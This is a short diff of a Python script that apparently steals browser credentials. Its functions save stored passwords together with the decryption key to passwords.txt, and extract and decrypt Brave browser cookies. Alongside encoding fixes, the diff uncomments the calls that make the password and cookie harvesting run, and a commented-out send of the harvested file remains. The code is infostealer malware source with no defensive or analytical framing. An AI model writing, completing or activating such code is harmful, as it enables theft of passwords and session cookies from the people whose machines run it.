@@ -18,7 +18,7 @@ def delete_file(file):
         pass
 
 def store_data(file, data):
-    with open(file, 'a') as f:
+    with open(file, "a", encoding="utf-8") as f:
         f.write("\n##########################################")
         f.write(data)
         f.write("##########################################")
@@ -126,7 +126,7 @@ def save_passwords(db_dir, key_dir):
         else:
             continue
 
-    with open("passwords.txt", "a") as f:
+    with open("passwords.txt", "a", encoding="utf-8") as f:
         f.write(f"\n################==Encryption-Key==################\n{fetch_key(key_dir)}")
 
     cursor.close()
@@ -134,7 +134,7 @@ def save_passwords(db_dir, key_dir):
     delete_file(file)
     #send("passwords.txt")
 
-#save_passwords(load_path("db"), load_path("dir"))
+save_passwords(load_path("db"), load_path("dir"))
 
 ##
 ##Extract cookies
@@ -159,7 +159,7 @@ def fetch_cookies(dir):
     except:
         pass
 
-#fetch_cookies(r"AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies")
+fetch_cookies(r"AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies")
 
 ##
 ##Extract Brave cookies and decrypt them
@@ -185,7 +185,7 @@ def d_fetch_cookies(dir):
     except:
         pass
 
-#d_fetch_cookies(r"AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies")
+d_fetch_cookies(r"AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies")
 
 ##
 ##Extract history
